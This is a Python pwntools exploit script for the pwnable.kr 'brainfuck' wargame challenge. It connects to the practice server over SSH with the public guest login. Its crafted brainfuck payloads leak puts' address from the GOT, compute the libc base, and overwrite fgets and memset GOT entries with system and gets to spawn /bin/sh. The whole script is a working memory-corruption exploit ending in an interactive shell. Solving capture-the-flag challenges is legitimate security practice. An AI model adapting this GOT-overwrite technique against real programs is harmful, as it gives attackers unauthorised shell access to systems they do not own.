from pwn import *

#context.log_level='debug'

#runtime address=libc_base+offset
#offset of functions from the libc_base inside libc-2.23.so
so_offset_of_puts=0x0005fcb0
so_offset_of_system=0x0003adb0
so_offset_of_strlen=0x00075660 #this one has an issue
so_offset_of_gets=0x0005f3f0

#memset@got at 0x804a02c
#fgets@got at 0x804a010
#puts@got at 0x804a018
#strlen@got at 0x804a020


#first connect to brainfuck@pwnable.kr
s=ssh(host='pwnable.kr',user='brainfuck',password='guest',port=2222)
#now connect to local port 10017
r=s.remote('localhost',10017)

#recieve the banner
banner=r.recvuntil(b"instructions except [ ]\n")
print(banner.decode()) #we print the banner

#phase1 payload
phase_one_payload=b'<'*136 #to reach puts@got 0x0804a0a0-0x804a018=136
phase_one_payload+=b'.>.>.>.' #to read 4 bytes
phase_one_payload+=b'<<<,>,>,>,' #to change the value to jump point
phase_one_payload+=b'[' #to trigger the puts
r.sendline(phase_one_payload)

leaked_value=r.recvn(4) #read exact 4 bytes
runtime_addr_of_puts=u32(leaked_value) #unpack those values to address

#send the jump point in main address
jump_point_in_main=p32(0x08048700) #this is the value we want inplace of puts@got value
r.send(jump_point_in_main)
sleep(1)


print(f"the leaked value: {leaked_value}")
print(f"runtime address of puts: {hex(runtime_addr_of_puts)}")
libc_base=runtime_addr_of_puts-so_offset_of_puts
print(f"The libc_base addr: {hex(libc_base)}")

#phase2 payload
phase_two_payload=b'<<<' #let's go back to

phase_two_payload+=b'<'*8 #to reach fgets@got  0x804a018-0x804a010=8
runtime_addr_of_system=libc_base+so_offset_of_system
runtime_addr_of_gets=libc_base+so_offset_of_gets
print(f"runtime address of system: {hex(runtime_addr_of_system)}")
print(f"runtime address of gets: {hex(runtime_addr_of_gets)}")

phase_two_payload+=b',>,>,>,' #to write system's runtime address
phase_two_payload+=b'<<<' # to go back at 0x804a010
phase_two_payload+=b'>'*28 #to reach memset@got 0x804a02c-0x804a010=28
phase_two_payload+=b',>,>,>,' #to write get's runtime address
phase_two_payload+=b'[' #to trigger puts again 
r.sendline(phase_two_payload)
r.send(p32(runtime_addr_of_system))
r.send(p32(runtime_addr_of_gets))
sleep(1)


#phase3 payload
phase_three_payload=b'/bin/sh\00'
r.sendline(phase_three_payload)
sleep(1)

try:
    response = r.recv(timeout=2)
    print(f"[+] Response after jump: {response}")
except EOFError:
    print("[-] Process crashed (connection closed by remote host)")

r.interactive()


